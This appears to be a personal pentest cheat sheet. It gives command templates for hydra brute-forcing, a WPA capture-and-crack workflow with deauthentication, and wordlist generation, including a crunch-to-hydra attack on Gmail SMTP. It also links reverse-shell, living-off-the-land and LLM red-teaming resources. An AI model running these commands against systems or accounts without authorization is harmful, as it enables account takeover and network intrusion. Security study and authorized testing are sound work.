# note_dump_games

Bruteforce
  - hydra
    - https://www.kali.org/tools/hydra/
    - https://youtu.be/-CMBoJ60K1A?t=910
    - Ex. ```hydra -l <username> -P <wordlist> <protocol>://<target.ip.here> -V -I -F -t <number of threads>```
  - aircrack (WPA)
    -  https://www.kali.org/tools/aircrack-ng/
    -  Ex.
      -  ```airmon-ng check kill```
      -  ```airmon-ng start <interface>```
        or
         ```ip link set <interface> down```
         ```iw <interface> set monitor none```
         ```ip link set <interface> up```
      -  ```airodump-ng <interface>```
      -  ```airodump-ng <interface> --channel <target channel> --bssid <target bssid> -w output```
      -  ```aireplay-ng --deauth 100 -a <target bssid> 0c <target mac> <interface>```
      -  ```aircrack-ng -w <worldlist> -b <target bssid> <cap file> -a2```
        or
         ```crunch [options] | aircrack-ng -b <target bssid> <cap file> -a2```
        or
         use hashcat

Wordlist generation
  - CeWL
    - https://www.kali.org/tools/cewl/
    - https://www.youtube.com/watch?v=ec1ZmW1YxqA
    - https://www.youtube.com/watch?v=nNvhK1LUD48
    - Ex. ```cewl --depth 2 --write path/to/wordlist.txt url```

  - Crunch
    - https://www.kali.org/tools/crunch/
    - https://www.youtube.com/watch?v=0ouVxR7hLvE
    - Ex. ```crunch 1 6 123456 --stdout | hydra -S -l [email protected] -v -V -e nsr -s 465 smtp.gmail.com smtp```

Command reference
  - TLDR
    -  https://tldr.inbrowser.app/
  - Reverse shells
    - https://www.revshells.com/
    - https://ub3rsec.github.io/pages/rev-shell-cheatsheet.html
    - https://0xffsec.com/handbook/shells/full-tty/
    - https://zweilosec.github.io/posts/upgrade-linux-shell/

Living off the land
  - https://lolbas-project.github.io/
  - https://gtfobins.github.io/
  - https://www.loldrivers.io/

Pentest Guides
  - https://book.hacktricks.xyz/
  - https://0xffsec.com/
  - https://www.stationx.net/how-to-use-aircrack-ng-tutorial/

LLM Stuff
  -  https://www.youtube.com/@intigriti
  -  https://www.promptfoo.dev/docs/red-team/

Hash reference
  - https://hashcat.net/wiki/doku.php?id=example_hashes
